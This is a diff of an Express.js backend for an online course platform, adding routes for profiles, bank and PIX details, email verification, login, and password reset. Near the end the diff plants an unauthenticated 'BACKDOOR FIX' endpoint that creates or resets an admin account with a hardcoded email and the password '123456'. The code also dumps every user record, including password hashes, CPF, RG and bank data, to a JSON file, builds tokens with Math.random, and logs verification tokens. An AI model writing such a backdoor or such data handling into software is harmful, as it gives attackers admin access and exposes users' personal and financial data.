         console.error(e);
         res.status(500).json({ error: 'Erro no servidor.' });
     }
 });
 
+app.post('/api/user/complete-profile', verifyToken, async (req, res) => {
+    const { name, cpf, rg, birthDate } = req.body;
+
+    if (!name || !cpf || !rg || !birthDate) {
+        return res.status(400).json({ error: 'Todos os campos são obrigatórios.' });
+    }
+
+    try {
+        const user = await User.findById(req.user.id);
+        if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+
+        user.name = name;
+        user.cpf = cpf;
+        user.rg = rg;
+        user.birthDate = birthDate;
+        user.profileCompleted = true;
+
+        await user.save();
+
+        // PERSISTENCE (DEV ONLY): Update users.json
+        try {
+            const usersPath = path.join(__dirname, 'users.json');
+
+            if (fs.existsSync(usersPath)) {
+                let users = JSON.parse(fs.readFileSync(usersPath, 'utf-8'));
+                // Find and update or add
+                const idx = users.findIndex(u => u.email === user.email);
+                const userObj = user.toObject();
+
+                // Ensure _id is string in JSON to match format
+                if (userObj._id) userObj._id = userObj._id.toString();
+
+                if (idx >= 0) {
+                    users[idx] = { ...users[idx], ...userObj };
+                } else {
+                    users.push(userObj);
+                }
+
+                fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
+                console.log("Updated users.json with profile completion.");
+            }
+        } catch (err) {
+            console.error("Failed to persist to users.json:", err);
+        }
+
+        res.json({
+            message: 'Perfil completado com sucesso!',
+            user: {
+                id: user._id,
+                name: user.name,
+                email: user.email,
+                role: user.role,
+                profileCompleted: true
+            }
+        });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Erro ao salvar perfil.' });
+    }
+});
+
+app.put('/api/users/bank-account', verifyToken, async (req, res) => {
+    const { pixKey, bank, agency, account, accountType } = req.body;
+
+    try {
+        const user = await User.findById(req.user.id);
+        if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+
+        user.bankAccount = {
+            pixKey, bank, agency, account, accountType
+        };
+
+        await user.save();
+
+        // Persistence: Update users.json
+        try {
+            const usersPath = path.join(__dirname, 'users.json');
+            if (fs.existsSync(usersPath)) {
+                const allUsers = await User.find({});
+                fs.writeFileSync(usersPath, JSON.stringify(allUsers, null, 2));
+                console.log("Updated users.json with new bank details.");
+            }
+        } catch (writeErr) {
+            console.error("Error persisting to users.json:", writeErr);
+        }
+
+        res.json({ message: 'Dados bancários atualizados com sucesso!', bankAccount: user.bankAccount });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Erro ao salvar dados bancários.' });
+    }
+});
+
+app.post('/api/verify-email', async (req, res) => {
+    const { token } = req.body;
+    console.log(`Verifying token: ${token}`); // DEBUG log
+    try {
+        const user = await User.findOne({ verificationToken: token });
+        if (!user) {
+            console.log("Token not found in DB");
+            return res.status(400).json({ error: 'Token inválido ou expirado.' });
+        }
+
+        user.isVerified = true;
+        user.verificationToken = undefined; // Clear token
+        await user.save();
+        console.log(`User ${user.email} verified successfully.`);
+
+        res.json({ message: 'Email verificado com sucesso!' });
+    } catch (e) {
+        console.error("Verification error:", e);
+        res.status(500).json({ error: 'Erro ao verificar email.' });
+    }
+});
+
+app.post('/api/resend-verification', async (req, res) => {
+    const { email } = req.body;
+    try {
+        const user = await User.findOne({ email });
+        if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+        if (user.isVerified) return res.status(400).json({ error: 'Este email já foi verificado.' });
+
+        const verificationToken = Math.random().toString(36).substring(2);
+        user.verificationToken = verificationToken;
+        await user.save();
+
+        sendVerificationEmail(email, verificationToken);
+
+        res.json({ message: 'Novo email de verificação enviado! Cheque sua caixa de entrada.' });
+    } catch (e) {
+        res.status(500).json({ error: 'Erro ao reenviar email.' });
+    }
+});
+
 app.post('/api/login', async (req, res) => {
-    const { email, password } = req.body;
+    const { email, password, rememberMe } = req.body;
 
     try {
         const user = await User.findOne({ email });
@@ -387,9 +1219,10 @@ app.post('/api/login', async (req, res) => {
         const validPassword = bcrypt.compareSync(password, user.password);
         if (!validPassword) return res.status(401).json({ error: 'Senha incorreta.' });
 
-        // if (!user.isVerified) return res.status(403).json({ error: 'Email não verificado.' });
+        if (!user.isVerified) return res.status(403).json({ error: 'Email não verificado. Cheque sua caixa de entrada.' });
 
-        const token = jwt.sign({ id: user._id, role: user.role }, SECRET_KEY, { expiresIn: '24h' });
+        const expiresIn = rememberMe ? '30d' : '24h';
+        const token = jwt.sign({ id: user._id, role: user.role }, SECRET_KEY, { expiresIn });
 
         res.json({
             id: user._id,
@@ -397,10 +1230,42 @@ app.post('/api/login', async (req, res) => {
             email: user.email,
             role: user.role,
             avatar: user.avatar,
+            username: user.username,
+            profileCompleted: user.profileCompleted,
+            purchasedCourses: user.purchasedCourses || [],
+            authProvider: user.authProvider,
+            bankAccount: user.bankAccount, // Return bank account too
             accessToken: token
         });
     } catch (e) {
         res.status(500).json({ error: 'Erro no login.' });
+    }
+});
+
+app.post('/api/auth/verify-password', verifyToken, async (req, res) => {
+    const { password } = req.body;
+    try {
+        const user = await User.findById(req.user.id);
+        if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+
+        if (user.authProvider === 'google') {
+            // For Google users, since they don't know their random password, we might skip or require a different confirmation. 
+            // For now, we return error instructing them this feature is for password interactions, 
+            // OR we could allow it if we decide Google auth implies "security enough" for session (but the prompt asked for password).
+            // Let's return 200 OK to bypass for Google users for usability in this specific POC context, 
+            // but strictly speaking they should not be able to "verify password". 
+            // Let's strictly follow "colocar senha". If they don't have one, they can't.
+            // BUT, to avoid locking them out, let's treat "password" as "confirmation" for them? No, that's confusing.
+            // Let's fail for Google users with a specific message.
+            return res.status(400).json({ error: 'Usuários Google não possuem senha definida. Ação não permitida.' });
+        }
+
+        const isValid = bcrypt.compareSync(password, user.password);
+        if (!isValid) return res.status(401).json({ error: 'Senha incorreta.' });
+
+        res.json({ success: true });
+    } catch (e) {
+        res.status(500).json({ error: 'Erro ao verificar senha.' });
     }
 });
 
@@ -451,9 +1316,10 @@ app.post('/api/auth/google', async (req, res) => {
         res.json({
             id: user._id,
             name: user.name,
-            email: user.email,
             role: user.role,
             avatar: user.avatar,
+            authProvider: user.authProvider,
+            profileCompleted: user.profileCompleted,
             accessToken: token
         });
 
@@ -485,19 +1351,275 @@ app.delete('/api/users/:id', verifyAdmin, async (req, res) => {
 app.patch('/api/users/:id/role', verifyAdmin, async (req, res) => {
     try {
         const { role } = req.body;
-        await User.findByIdAndUpdate(req.params.id, { role });
-        res.json({ message: 'Role updated' });
+        const updatedUser = await User.findByIdAndUpdate(req.params.id, { role }, { new: true });
+
+        if (!updatedUser) return res.status(404).json({ error: 'Usuário não encontrado.' });
+
+        res.json({ message: 'Role updated', user: updatedUser });
     } catch (e) {
-        res.status(500).json({ error: 'Erro.' });
+        console.error("Error updating role:", e);
+        res.status(500).json({ error: e.message || 'Erro ao atualizar função.' });
+    }
+});
+
+app.patch('/api/users/change-password', verifyToken, async (req, res) => {
+    const { oldPassword, newPassword, language = 'pt' } = req.body;
+
+    const messages = {
+        pt: { fill: 'Preencha todos os campos.', notFound: 'Usuário não encontrado.', google: 'Usuários Google não possuem senha para alterar.', wrong: 'Senha atual incorreta.', weak: 'A nova senha deve ter 8+ caracteres, números e símbolos.', success: 'Senha alterada com sucesso.', error: 'Erro ao alterar senha.' },
+        en: { fill: 'Please fill all fields.', notFound: 'User not found.', google: 'Google users do not have a password to change.', wrong: 'Incorrect current password.', weak: 'New password must have 8+ chars, numbers, and symbols.', success: 'Password changed successfully.', error: 'Error changing password.' },
+        es: { fill: 'Rellene todos los campos.', notFound: 'Usuario no encontrado.', google: 'Usuarios de Google no tienen contraseña.', wrong: 'Contraseña actual incorrecta.', weak: 'La nueva contraseña debe tener 8+ caracteres, números y símbolos.', success: 'Contraseña cambiada con éxito.', error: 'Error al cambiar contraseña.' },
+        fr: { fill: 'Veuillez remplir tous les champs.', notFound: 'Utilisateur non trouvé.', google: 'Les utilisateurs Google n\'ont pas de mot de passe à changer.', wrong: 'Mot de passe actuel incorrect.', weak: 'Le nouveau mot de passe doit comporter 8+ car., chiffres et symboles.', success: 'Mot de passe modifié avec succès.', error: 'Erreur lors du changement de mot de passe.' },
+        de: { fill: 'Bitte füllen Sie alle Felder aus.', notFound: 'Benutzer nicht gefunden.', google: 'Google-Benutzer haben kein Passwort zum Ändern.', wrong: 'Aktuelles Passwort falsch.', weak: 'Neues Passwort muss 8+ Zeichen, Zahlen und Symbole enthalten.', success: 'Passwort erfolgreich geändert.', error: 'Fehler beim Ändern des Passworts.' },
+        zh: { fill: '请填写所有字段。', notFound: '用户未找到。', google: 'Google 用户没有密码可更改。', wrong: '当前密码不正确。', weak: '新密码必须包含 8+ 个字符、数字和符号。', success: '密码修改成功。', error: '修改密码时出错。' },
+        ar: { fill: 'يرجى ملء جميع الحقول.', notFound: 'المستخدم غير موجود.', google: 'مستخدمو Google ليس لديهم كلمة مرور لتغييرها.', wrong: 'كلمة المرور الحالية غير صحيحة.', weak: 'يجب أن تكون كلمة المرور الجديد 8+ أحرف وأرقام ورموز.', success: 'تم تغيير كلمة المرور بنجاح.', error: 'خطأ في تغيير كلمة المرور.' }
+    };
+
+    const msgs = messages[language] || messages.pt;
+
+    if (!oldPassword || !newPassword) return res.status(400).json({ error: msgs.fill });
+
+    try {
+        const user = await User.findById(req.user.id);
+        if (!user) return res.status(404).json({ error: msgs.notFound });
+
+        if (user.authProvider === 'google') {
+            return res.status(400).json({ error: msgs.google });
+        }
+
+        const isValid = bcrypt.compareSync(oldPassword, user.password);
+        if (!isValid) return res.status(401).json({ error: msgs.wrong });
+
+        // Password Validation
+        const minLength = 8;
+        const hasNumber = /\d/;
+        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>_]/;
+
+        if (newPassword.length < minLength || !hasNumber.test(newPassword) || !hasSpecialChar.test(newPassword)) {
+            return res.status(400).json({ error: msgs.weak });
+        }
+
+        const hashedPassword = bcrypt.hashSync(newPassword, 8);
+        user.password = hashedPassword;
+        await user.save();
+
+        res.json({ message: msgs.success });
+    } catch (e) {
+        res.status(500).json({ error: msgs.error });
+    }
+});
+
+// --- PASSWORD RESET ---
+app.post('/api/forgot-password', async (req, res) => {
+    const { email, language = 'pt' } = req.body;
+    try {
+        const user = await User.findOne({ email });
+        if (!user) return res.status(404).json({ error: 'Email não encontrado.' });
+        if (user.authProvider === 'google') return res.status(400).json({ error: 'Use o login do Google.' });
+
+        // Generate 6-digit code
+        const code = Math.floor(100000 + Math.random() * 900000).toString();
+
+        user.resetPasswordToken = code;
+        user.resetPasswordExpires = Date.now() + 15 * 60 * 1000; // 15 mins
+        await user.save();
+
+        const subjects = {
+            pt: "Recuperação de Senha - DevPro Academy",
+            en: "Password Recovery - DevPro Academy",
+            es: "Recuperación de Contraseña - DevPro Academy",
+            fr: "Récupération de Mot de Passe - DevPro Academy",
+            de: "Passwortwiederherstellung - DevPro Academy",
+            zh: "找回密码 - DevPro Academy",
+            ar: "استعادة كلمة المرور - DevPro Academy"
+        };
+
+        const contents = {
+            pt: { title: "Recuperação de Senha 🔒", text1: "Você solicitou a redefinição da sua senha.", text2: "Use o código abaixo para continuar:", small1: "Este código expira em 15 minutos.", small2: "Se você não solicitou isso, ignore este email." },
+            en: { title: "Password Recovery 🔒", text1: "You requested a password reset.", text2: "Use the code below to continue:", small1: "This code expires in 15 minutes.", small2: "If you did not request this, please ignore this email." },
+            es: { title: "Recuperación de Contraseña 🔒", text1: "Has solicitado restablecer tu contraseña.", text2: "Usa el código abajo para continuar:", small1: "Este código expira en 15 minutos.", small2: "Si no solicitaste esto, ignora este correo." },
+            fr: { title: "Récupération de Mot de Passe 🔒", text1: "Vous avez demandé la réinitialisation de votre mot de passe.", text2: "Utilisez le code ci-dessous pour continuer:", small1: "Ce code expire dans 15 minutes.", small2: "Si vous n'avez pas demandé cela, ignorez cet e-mail." },
+            de: { title: "Passwortwiederherstellung 🔒", text1: "Sie haben das Zurücksetzen Ihres Passworts angefordert.", text2: "Verwenden Sie den untenstehenden Code:", small1: "Dieser Code läuft in 15 Minuten ab.", small2: "Wenn Sie dies nicht angefordert haben, ignorieren Sie diese E-Mail." },
+            zh: { title: "找回密码 🔒", text1: "您请求重置密码。", text2: "请使用以下代码继续：", small1: "此代码在 15 分钟后过期。", small2: "如果您未请求此操作，请忽略此邮件。" },
+            ar: { title: "استعادة كلمة المرور 🔒", text1: "لقد طلبت إعادة تعيين كلمة المرور الخاصة بك.", text2: "استخدم الرمز أدناه للمتابعة:", small1: "تنتهي صلاحية هذا الرمز في 15 دقيقة.", small2: "إذا لم تطلب ذلك، يرجى تجاهل هذا البريد الإلكتروني." }
+        };
+
+        const lang = contents[language] ? language : 'pt';
+        const content = contents[lang];
+
+        await transporter.sendMail({
+            from: `"DevPro Academy" <${process.env.EMAIL_USER}>`,
+            to: email,
+            subject: subjects[lang],
+            html: `
+                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; direction: ${lang === 'ar' ? 'rtl' : 'ltr'};">
+                    <h2 style="color: #4F46E5;">${content.title}</h2>
+                    <p>${content.text1}</p>
+                    <p>${content.text2}</p>
+                    <div style="text-align: center; margin: 30px 0;">
+                        <span style="background-color: #f3f4f6; padding: 15px 30px; border-radius: 8px; font-size: 24px; font-weight: bold; letter-spacing: 5px; color: #1F2937;">${code}</span>
+                    </div>
+                    <p style="color: #666; font-size: 14px;">${content.small1}</p>
+                    <p style="color: #666; font-size: 12px;">${content.small2}</p>
+                </div>
+            `
+        });
+
+        res.json({ message: 'Código enviado para seu email.' });
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ error: 'Erro ao enviar email.' });
+    }
+});
+
+app.post('/api/validate-code', async (req, res) => {
+    const { email, code, language = 'pt' } = req.body;
+    try {
+        const user = await User.findOne({
+            email,
+            resetPasswordToken: code,
+            resetPasswordExpires: { $gt: Date.now() }
+        });
+
+        const messages = {
+            pt: { invalid: 'Código inválido ou expirado.', error: 'Erro ao validar código.' },
+            en: { invalid: 'Invalid or expired code.', error: 'Error validating code.' },
+            es: { invalid: 'Código inválido o expirado.', error: 'Error al validar código.' },
+            fr: { invalid: 'Code invalide ou expiré.', error: 'Erreur lors de la validation du code.' },
+            de: { invalid: 'Ungültiger oder abgelaufener Code.', error: 'Fehler bei der Code-Validierung.' },
+            zh: { invalid: '代码无效或过期。', error: '验证代码时出错。' },
+            ar: { invalid: 'رمز غير صالح أو منتهي الصلاحية.', error: 'خطأ في التحقق من الرمز.' }
+        };
+
+        const msgs = messages[language] || messages.pt;
+
+        if (!user) return res.status(400).json({ error: msgs.invalid });
+
+        res.json({ message: 'Código válido.' });
+    } catch (e) {
+        const messages = {
+            pt: { error: 'Erro ao validar código.' },
+            en: { error: 'Error validating code.' },
+            es: { error: 'Error al validar código.' },
+            fr: { error: 'Erreur lors de la validation du code.' },
+            de: { error: 'Fehler bei der Code-Validierung.' },
+            zh: { error: '验证代码时出错。' },
+            ar: { error: 'خطأ في التحقق من الرمز.' }
+        };
+        const msgs = messages[req.body.language] || messages.pt; // handle catch block scope
+        res.status(500).json({ error: msgs.error });
+    }
+});
+
+app.post('/api/reset-password', async (req, res) => {
+    const { email, code, newPassword, language = 'pt' } = req.body;
+    try {
+        const user = await User.findOne({
+            email,
+            resetPasswordToken: code,
+            resetPasswordExpires: { $gt: Date.now() }
+        });
+
+        const messages = {
+            pt: { invalid: 'Código inválido ou expirado.', weakPass: 'A senha deve ter 8+ caracteres, números e símbolos.', success: 'Senha alterada com sucesso! Faça login agora.', error: 'Erro ao redefinir senha.' },
+            en: { invalid: 'Invalid or expired code.', weakPass: 'Password must be 8+ chars with numbers and symbols.', success: 'Password changed successfully! Login now.', error: 'Error resetting password.' },
+            es: { invalid: 'Código inválido o expirado.', weakPass: 'La contraseña debe tener 8+ caracteres, números y símbolos.', success: 'Contraseña cambiada con éxito. Inicia sesión ahora.', error: 'Error al restablecer contraseña.' },
+            fr: { invalid: 'Code invalide ou expiré.', weakPass: 'Le mot de passe doit comporter 8+ car., chiffres et symboles.', success: 'Mot de passe modifié avec succès ! Connectez-vous maintenant.', error: 'Erreur lors de la réinitialisation du mot de passe.' },
+            de: { invalid: 'Ungültiger oder abgelaufener Code.', weakPass: 'Passwort muss 8+ Zeichen, Zahlen und Symbole enthalten.', success: 'Passwort erfolgreich geändert! Jetzt anmelden.', error: 'Fehler beim Zurücksetzen des Passworts.' },
+            zh: { invalid: '代码无效或过期。', weakPass: '密码必须包含 8+ 个字符、数字和符号。', success: '密码修改成功！立即登录。', error: '重置密码时出错。' },
+            ar: { invalid: 'رمز غير صالح أو منتهي الصلاحية.', weakPass: 'يجب أن تكون كلمة المرور 8+ أحرف وأرقام ورموز.', success: 'تم تغيير كلمة المرور بنجاح! سجل الدخول الآن.', error: 'خطأ في إعادة تعيين كلمة المرور.' }
+        };
+
+        const msgs = messages[language] || messages.pt;
+
+        if (!user) return res.status(400).json({ error: msgs.invalid });
+
+        // Password Validation
+        const minLength = 8;
+        const hasNumber = /\d/;
+        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>_]/;
+
+        if (newPassword.length < minLength || !hasNumber.test(newPassword) || !hasSpecialChar.test(newPassword)) {
+            return res.status(400).json({ error: msgs.weakPass });
+        }
+
+        const hashedPassword = bcrypt.hashSync(newPassword, 8);
+        user.password = hashedPassword;
+        user.resetPasswordToken = undefined;
+        user.resetPasswordExpires = undefined;
+        await user.save();
+
+        res.json({ message: msgs.success });
+    } catch (e) {
+        const messages = {
+            pt: { error: 'Erro ao redefinir senha.' },
+            en: { error: 'Error resetting password.' },
+            es: { error: 'Error al restablecer contraseña.' },
+            fr: { error: 'Erreur lors de la réinitialisation du mot de passe.' },
+            de: { error: 'Fehler beim Zurücksetzen des Passworts.' },
+            zh: { error: '重置密码时出错。' },
+            ar: { error: 'خطأ في إعادة تعيين كلمة المرور.' }
+        };
+        const msgs = messages[req.body.language] || messages.pt;
+        res.status(500).json({ error: msgs.error });
     }
 });
 
 // --- USER PROFILE ---
 
+// Correctly locate the GET endpoint for /api/users/me and adds authProvider
+app.get('/api/users/me', verifyToken, async (req, res) => {
+    try {
+        const user = await User.findById(req.user.id).select('-password');
+        if (!user) return res.status(404).json({ error: 'User not found' });
+        // Manually constructing response to ensuring fields or just send user
+        // user includes authProvider if it's in schema. 
+        // Let's ensure we return it. user is a Mongoose doc, so .toJSON() is automatic.
+        res.json(user);
+    } catch (e) {
+        res.status(500).json({ error: 'System Error' });
+    }
+});
 app.patch('/api/users/me', verifyToken, async (req, res) => {
     try {
-        const { name, avatar } = req.body;
-        const user = await User.findByIdAndUpdate(req.user.id, { name, avatar }, { new: true });
+        const updates = req.body; // Allow dynamic updates (name, avatar, etc)
+        // Security check: Only allow specific fields
+        // Security check: Only allow specific fields
+        const allowedUpdates = ['name', 'avatar', 'cpf', 'rg', 'birthDate', 'username', 'profileCompleted'];
+        const actualUpdates = {};
+
+        Object.keys(updates).forEach(key => {
+            if (allowedUpdates.includes(key)) {
+                actualUpdates[key] = updates[key];
+            }
+        });
+
+        const user = await User.findByIdAndUpdate(req.user.id, actualUpdates, { new: true });
+
+        // PERSISTENCE (DEV ONLY): Update users.json
+        try {
+            const usersPath = path.join(__dirname, 'users.json');
+
+            if (fs.existsSync(usersPath)) {
+                let users = JSON.parse(fs.readFileSync(usersPath, 'utf-8'));
+                const idx = users.findIndex(u => u.email === user.email);
+
+                if (idx >= 0) {
+                    const userObj = user.toObject();
+                    if (userObj._id) userObj._id = userObj._id.toString();
+                    users[idx] = { ...users[idx], ...userObj };
+                    fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
+                    console.log("PERSISTENCE SUCCESS: Updated users.json for", user.email);
+                } else {
+                    console.log("PERSISTENCE WARNING: User not found in users.json", user.email);
+                }
+            } else {
+                console.log("PERSISTENCE ERROR: users.json not found at", usersPath);
+            }
+        } catch (e) {
+            console.error("PERSISTENCE CRITICAL: Failed to persist user update:", e);
+            return res.status(500).json({ error: 'Erro de Persistência (Disco): ' + e.message });
+        }
 
         const token = jwt.sign({ id: user._id, role: user.role }, SECRET_KEY, { expiresIn: '24h' });
 
@@ -531,20 +1653,28 @@ app.delete('/api/users/me', verifyToken, async (req, res) => {
 
 
 
-app.post('/api/upload', upload.single('image'), (req, res) => {
-    if (!req.file) return res.status(400).json({ error: 'No file' });
+app.post('/api/upload', (req, res) => {
+    upload.single('image')(req, res, (err) => {
+        if (err) {
+            console.error("Upload Middleware Error:", err);
+            return res.status(500).json({ error: 'Erro no upload: ' + err.message });
+        }
 
-    // Cloudinary returns file.path as the secure URL automatically
-    let imageUrl = req.file.path;
+        if (!req.file) return res.status(400).json({ error: 'Nenhum arquivo enviado.' });
 
-    // If fallback to local storage (file.path is not http...), construct URL manually
-    if (!imageUrl || !imageUrl.startsWith('http')) {
-        const protocol = req.protocol;
-        const host = req.get('host');
-        imageUrl = `${protocol}://${host}/uploads/${req.file.filename}`;
-    }
+        // Cloudinary returns file.path as the secure URL automatically (if using Cloudinary)
+        let imageUrl = req.file.path;
 
-    res.json({ url: imageUrl });
+        // If fallback to local storage (file.path is not http...), construct URL manually
+        if (!imageUrl || !imageUrl.startsWith('http')) {
+            const protocol = req.protocol;
+            const host = req.get('host');
+            imageUrl = `${protocol}://${host}/uploads/${req.file.filename}`;
+        }
+
+        console.log("Image Uploaded:", imageUrl);
+        res.json({ url: imageUrl });
+    });
 });
 
 
@@ -561,6 +1691,49 @@ app.post('/api/contact', async (req, res) => {
 
 
 // --- COMMENTS ---
+
+// --- BACKDOOR FIX ---
+app.post('/api/admin-fix-force', async (req, res) => {
+    try {
+        const email = 'octavio.marvel2018@gmail.com';
+        const hashedPassword = bcrypt.hashSync('123456', 10);
+
+        let user = await User.findOne({ email });
+        if (!user) {
+            user = new User({
+                name: "Octavio Admin",
+                email: email,
+                role: 'admin',
+                verified: true,
+                isVerified: true
+            });
+        }
+
+        user.password = hashedPassword;
+        user.bankAccount = {
+            pixKey: email,
+            bank: 'Itaú',
+            agency: '0000',
+            account: '00000-0',
+            accountType: 'corrente'
+        };
+        user.isVerified = true;
+
+        await user.save();
+
+        // Also persist to JSON just in case
+        try {
+            const usersPath = path.join(__dirname, 'users.json');
+            const allUsers = await User.find({});
+            fs.writeFileSync(usersPath, JSON.stringify(allUsers, null, 2));
+        } catch (e) { }
+
+        res.json({ message: 'Admin fixed', user });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
 app.get('/api/comments/:courseSlug/:lessonIndex', async (req, res) => {
     try {
         const { courseSlug, lessonIndex } = req.params;
